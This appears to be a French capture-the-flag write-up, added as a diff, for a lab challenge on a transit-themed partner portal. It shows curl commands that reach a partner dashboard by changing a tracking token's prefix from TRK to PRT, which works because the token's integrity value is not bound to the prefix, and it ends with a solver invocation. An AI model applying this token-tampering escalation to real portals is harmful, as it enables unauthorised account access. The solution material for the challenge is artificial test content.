@@ -1,0 +1,97 @@
+Source locale : web/depart/writeup-INTERNAL-DISPATCH.md
+Copie documentaire expurgée ; les affirmations restent celles de la source.
+
+# INTERNAL DISPATCH — Northline Transit (q:2)
+
+## Objectif
+
+Accéder à l'espace partenaire interne et récupérer l'identifiant de session
+affiché sur le tableau de bord.
+
+## État initial
+
+- Cible : `http://172.28.38.2:8080`
+- Reçu `recu_northline.png` avec un QR vers `/track/TRK.<id>.<integrite>`.
+- `/login` refuse `TRK` mais accepte `PRT`.
+
+## Reconnaissance
+
+1. Extraction du code de suivi :
+
+   ```bash
+   zbarimg --raw -q recu_northline.png
+   ```
+
+2. Tentative de connexion avec le code tel quel :
+
+   ```bash
+   curl -i -X POST http://172.28.38.2:8080/login \
+        -d 'code=TRK.<id>.<integrite>'
+   # -> message « invalide ou expiré »
+   ```
+
+3. Substitution du préfixe `TRK` → `PRT` en conservant identifiant et
+   intégrité :
+
+   ```bash
+   curl -i -X POST http://172.28.38.2:8080/login \
+        -d 'code=PRT.<id>.<integrite>'
+   # -> 302 /dashboard
+   ```
+
+## Interprétation
+
+Le jeton de suivi public et le jeton partenaire partagent le même identifiant
+et la même intégrité ; seul le préfixe change le contexte d'autorisation.
+L'intégrité n'authentifie donc pas le préfixe, ce qui permet une élévation de
+contexte.
+
+Après connexion, `/dashboard` affiche :
+
+- le compte partenaire **Skarvik Marine Services** (`partner-1042`) ;
+- une carte `flag-card` contenant l'identifiant de session attendu.
+
+## Exploitation
+
+```bash
+# 1. connexion
+curl -s -c cj -X POST http://172.28.38.2:8080/login \
+     -d 'code=PRT.<id>.<integrite>'
+
+# 2. lecture du tableau de bord
+curl -s -b cj http://172.28.38.2:8080/dashboard \
+  | grep -o '<section class="flag-card">.*</section>'
+```
+
+La carte contient l'identifiant de session (valeur volontairement masquée ici).
+
+## Chemins qui ont échoué
+
+- **Préfixe `TRK` en login** : rejeté.
+- **Autres préfixes** (`PUB`, `OPS`, etc.) : « invalide ou expiré ».
+- **Accès direct à `/dashboard` sans session** : redirection vers `/login`.
+
+## Validation reproductible (sans la réponse)
+
+```bash
+python3 solveur.py --target http://172.28.38.2:8080 \
+  --code PRT.<id>.<integrite> --q2
+```
+
+Sortie attendue :
+
+```
+[+] POST /login -> 302
+[+] session partenaire : Skarvik Marine Services
+[+] FLAG q:2 : <identifiant de session>
+```
+
+La valeur affichée doit correspondre à celle de la carte `flag-card` de
+`/dashboard`.
+
+## Leçons
+
+- Un identifiant signé sans liaison au préfixe/contexte autorise un changement
+  de rôle.
+- Toujours tester les variantes de préfixe d'un jeton avant de conclure qu'il
+  est invalide.
